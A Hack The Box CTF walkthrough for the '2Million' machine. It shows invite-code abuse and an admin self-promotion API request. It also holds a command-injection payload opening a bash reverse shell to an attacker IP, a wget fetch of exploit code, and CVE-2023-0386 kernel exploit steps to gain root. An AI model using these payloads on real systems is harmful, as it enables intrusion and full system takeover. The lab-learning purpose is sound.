# Hack The Box — *2Million* Writeup

> **Disclaimer**: This writeup is for educational purposes only. All actions were performed in a controlled CTF environment.

---

## 🔍 Enumeration

### Port Scanning

First, scan the target for open ports and services:

```bash
nmap -sC -sV -Pn <IP>
```

**Result:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
```

The HTTP service redirects to a virtual host:

```
http://2million.htb/
```

Add it to `/etc/hosts`:

```bash
<IP> 2million.htb
```

---

## 🌐 Web Application Analysis

Open the website and click **Join → Join HTB**.

The page requires an **invite code**. Inspecting the page using browser DevTools → **Network**, we find:

```
/js/inviteapi.min.js
```

Open the file, copy its contents, and beautify it (for example using `beautifier.io`). The relevant functions are:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify'
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate'
    })
}
```

The function `makeInviteCode()` looks promising.

---

## 🧪 Invite Code Generation

Trigger the endpoint manually:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

**Response:**

```json
{
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr...",
    "enctype": "ROT13"
  }
}
```

Decode the `data` field using **ROT13**:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Generate the invite code:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r .data.code | base64 -d
```

✅ **Invite Code obtained**

Register a new user and log in.

---

## 🔑 API Exploration & Privilege Escalation

While browsing `/home/access`, intercept traffic with **Burp Suite** and observe:

```
GET /api/v1/user/vpn/regenerate
```

Test `/api/v1` directly:

```bash
curl http://2million.htb/api/v1
```

This reveals all available API routes, including **admin endpoints**.

Check authentication status:

```http
GET /api/v1/user/auth
```

```json
{
  "loggedin": true,
  "username": "user2",
  "is_admin": 0
}
```

### ⚠️ Broken Access Control

Attempt to update admin settings:

```http
PUT /api/v1/admin/settings/update
Content-Type: application/json

{
  "email": "user2@user2.user2",
  "is_admin": 1
}
```

**Response:**

```json
{
  "id": 14,
  "username": "user2",
  "is_admin": 1
}
```

✅ **Privilege escalation to admin successful**

---

## 🐚 Remote Code Execution → Shell

Exploit command injection in the admin VPN generation endpoint:

```http
POST /api/v1/admin/vpn/generate
Content-Type: application/json

{
  "username": "user2$(bash -c 'bash -i >& /dev/tcp/10.10.14.183/9001 0>&1')"
}
```

Start a listener:

```bash
nc -lnvp 9001
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🗄️ Database Credentials Disclosure

Inside `/home/www` find `.env`:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Connect to MariaDB:

```bash
mysql -u admin -p
```

Enumerate:

```sql
USE htb_prod;
SHOW TABLES;
SELECT * FROM users;
```

Passwords are hashed, but credentials work for **SSH access**.

---

## 🔐 User Flag

Login via SSH using the database credentials and obtain:

```
user.txt
```

---

## 🚀 Privilege Escalation — CVE-2023-0386

The system is vulnerable to **CVE-2023-0386** (OverlayFS Local Privilege Escalation).

Exploit reference:

* [https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)

### Exploit Setup

On attacker machine:

```bash
python3 -m http.server 8000
```

On target:

```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<VPN_IP>:8000/CVE-2023-0386/
chmod +x *.c Makefile
make all
```

Run exploit (two terminals required):

**Terminal 1:**

```bash
./fuse ./ovlcap/lower ./gc
```

**Terminal 2:**

```bash
./exp
```

---

## 🏁 Proof of Concept

```bash
root@2million:~# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
root flag: cat /root/root.txt
```

✅ **Root access achieved**

---

## 🧠 Key Takeaways

* Broken access control in APIs is extremely dangerous
* Client-side JavaScript often leaks critical logic
* Always enumerate API routes
* Public kernel exploits remain highly effective

---

**Happy hacking 🚀**
